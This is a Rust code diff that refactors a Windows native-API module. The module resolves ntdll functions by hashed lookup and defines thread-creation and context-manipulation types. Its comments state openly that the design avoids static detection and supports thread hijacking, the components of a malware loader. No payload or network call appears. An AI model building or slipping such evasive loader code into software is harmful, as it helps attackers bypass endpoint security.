@@ -6,30 +6,27 @@ use std::mem;
 use crate::native::peb_parsing_by_hash::{find_function_by_hash, simple_hash, find_ntdll_simple};
 
 
-// Constantes pour NtAllocateVirtualMemory
+// === Memory allocation constants for use with NtAllocateVirtualMemory ===
 pub const MEM_COMMIT: u32 = 0x00001000;
 pub const MEM_RESERVE: u32 = 0x00002000;
 pub const PAGE_READWRITE: u32 = 0x04;
-pub const PAGE_EXECUTE_READ: u32 = 0x20;
 pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 pub const MEM_RELEASE: u32 = 0x8000;
-// Constante pour thread suspendu
-pub const THREAD_CREATE_FLAGS_CREATE_SUSPENDED: u32 = 0x00000001;
-pub const THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER: u32 = 0x00000004;
-pub const CONTEXT_FULL: u32 = 0x00010007;
-pub const CONTEXT_ALL: u32 = 0x0001003F;
 
+// === Context flags for NtGetContextThread / NtSetContextThread ===
+pub const CONTEXT_FULL: u32 = 0x00010007;
+
+// === File access flags ===
 pub const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
 pub const FILE_READ_ATTRIBUTES: u32 = 0x0080;
 pub const FILE_SHARE_READ: u32 = 0x00000001;
-pub const FILE_SHARE_WRITE: u32 = 0x00000002;
-pub const FILE_SHARE_DELETE: u32 = 0x00000004;
 pub const FILE_OPEN: u32 = 0x00000001;
 pub const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
 pub const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
 
 pub const FileStandardInformation: u32 = 5;
 
+// === Required NT kernel-level structures ===
 #[repr(C)]
 pub struct IO_STATUS_BLOCK {
     pub Status: i32,
@@ -53,42 +50,17 @@ pub struct FILE_STANDARD_INFORMATION {
     pub _reserved: [u8; 2],
 }
 
-pub type NtCreateThreadExFn = unsafe extern "system" fn(
-    ThreadHandle: *mut *mut c_void,
-    DesiredAccess: u32,
-    ObjectAttributes: *mut c_void,
-    ProcessHandle: *mut c_void,
-    StartRoutine: *mut c_void,
-    Argument: *mut c_void,
-    CreateFlags: u32,
-    ZeroBits: usize,
-    StackSize: usize,
-    MaximumStackSize: usize,
-    AttributeList: *mut c_void,
-) -> i32;
+#[repr(C)]
+pub struct OBJECT_ATTRIBUTES {
+    pub Length: u32,
+    pub RootDirectory: *mut c_void,
+    pub ObjectName: *mut UNICODE_STRING,
+    pub Attributes: u32,
+    pub SecurityDescriptor: *mut c_void,
+    pub SecurityQualityOfService: *mut c_void,
+}
 
-pub type NtGetContextThreadFn = unsafe extern "system" fn(
-    ThreadHandle: *mut c_void,
-    Context: *mut CONTEXT,
-) -> i32;
-
-pub type NtSetContextThreadFn = unsafe extern "system" fn(
-    ThreadHandle: *mut c_void,
-    Context: *const CONTEXT,
-) -> i32;
-
-pub type NtDelayExecutionFn = unsafe extern "system" fn(
-    Alertable: u8,
-    DelayInterval: *const i64,
-) -> i32;
-
-pub type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
-    ProcessHandle: *mut c_void,
-    BaseAddress: *mut *mut c_void,
-    RegionSize: *mut usize,
-    FreeType: u32,
-) -> i32;
-
+// === CONTEXT structure for x64 threads (used in thread hijacking) ===
 #[repr(C)]
 #[derive(Debug, Clone, Copy)]
 pub struct M128A {
@@ -96,7 +68,7 @@ pub struct M128A {
     pub High: i64,
 }
 
-// Structure CONTEXT pour x64
+
 #[repr(C)]
 #[derive(Debug, Clone, Copy)]
 pub struct CONTEXT {
@@ -148,7 +120,45 @@ pub struct CONTEXT {
     pub LastExceptionFromRip: u64,
 }
 
-// Définitions des types pour les APIs natives
+// === Type aliases for dynamically resolved NTAPI function pointers ===
+
+pub type NtCreateThreadExFn = unsafe extern "system" fn(
+    ThreadHandle: *mut *mut c_void,
+    DesiredAccess: u32,
+    ObjectAttributes: *mut c_void,
+    ProcessHandle: *mut c_void,
+    StartRoutine: *mut c_void,
+    Argument: *mut c_void,
+    CreateFlags: u32,
+    ZeroBits: usize,
+    StackSize: usize,
+    MaximumStackSize: usize,
+    AttributeList: *mut c_void,
+) -> i32;
+
+pub type NtGetContextThreadFn = unsafe extern "system" fn(
+    ThreadHandle: *mut c_void,
+    Context: *mut CONTEXT,
+) -> i32;
+
+pub type NtSetContextThreadFn = unsafe extern "system" fn(
+    ThreadHandle: *mut c_void,
+    Context: *const CONTEXT,
+) -> i32;
+
+pub type NtDelayExecutionFn = unsafe extern "system" fn(
+    Alertable: u8,
+    DelayInterval: *const i64,
+) -> i32;
+
+pub type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
+    ProcessHandle: *mut c_void,
+    BaseAddress: *mut *mut c_void,
+    RegionSize: *mut usize,
+    FreeType: u32,
+) -> i32;
+
+
 pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
     ProcessHandle: *mut c_void,
     BaseAddress: *mut *mut c_void,
@@ -216,16 +226,9 @@ pub type NtQueryInformationFileFn = unsafe extern "system" fn(
     FileInformationClass: u32,
 ) -> i32;
 
-// Structures nécessaires
-#[repr(C)]
-pub struct OBJECT_ATTRIBUTES {
-    pub Length: u32,
-    pub RootDirectory: *mut c_void,
-    pub ObjectName: *mut UNICODE_STRING,
-    pub Attributes: u32,
-    pub SecurityDescriptor: *mut c_void,
-    pub SecurityQualityOfService: *mut c_void,
-}
+
+// === Resolver functions for each NTAPI symbol ===
+// These use hashed lookup (not IAT) to avoid static detection
 
 
 pub fn get_nt_allocate_virtual_memory() -> Option<NtAllocateVirtualMemoryFn> {
@@ -285,7 +288,8 @@ pub fn get_nt_query_information_file() -> Option<NtQueryInformationFileFn> {
 }
 
 
-// Structure regroupant les fonctions natives
+// === Dynamic NTAPI structure ===
+// Represents a fully initialized table of function pointers to NT native routines
 pub struct NativeAPI {
     pub nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn,
     pub nt_protect_virtual_memory: NtProtectVirtualMemoryFn,
@@ -305,6 +309,8 @@ pub struct NativeAPI {
 
 
 impl NativeAPI {
+    /// Dynamically resolves and loads all necessary NTAPI functions
+    /// into a NativeAPI struct instance. Returns an error if any call fails.
     pub fn new() -> Result<Self, String> {
         
         let nt_allocate = get_nt_allocate_virtual_memory()
@@ -371,30 +377,16 @@ impl NativeAPI {
 
 
 
-
+/// Generic function to resolve a function from ntdll.dll using a custom hash-based parser.
+///
+/// This avoids importing symbols statically, and supports full API resolution
+/// from memory-mapped `ntdll.dll` based on `find_function_by_hash()`
 pub fn get_function<T>(function_name: &str) -> Option<T> {
-    
     let hash_func: u32 = simple_hash(function_name);
 
     unsafe {
-        let ntdll_base = match find_ntdll_simple() {
-            Some(addr) => {
-                addr
-            },
-            None => {
-                return None;
-            }
-        };
-
-        let func_addr = match find_function_by_hash(ntdll_base, hash_func) {
-            Some(addr) => {
-                addr
-            },
-            None => {
-                return None;
-            }
-        };
-        
+        let ntdll_base = find_ntdll_simple()?;
+        let func_addr = find_function_by_hash(ntdll_base, hash_func)?;
         Some(mem::transmute_copy(&func_addr))
     }
 }
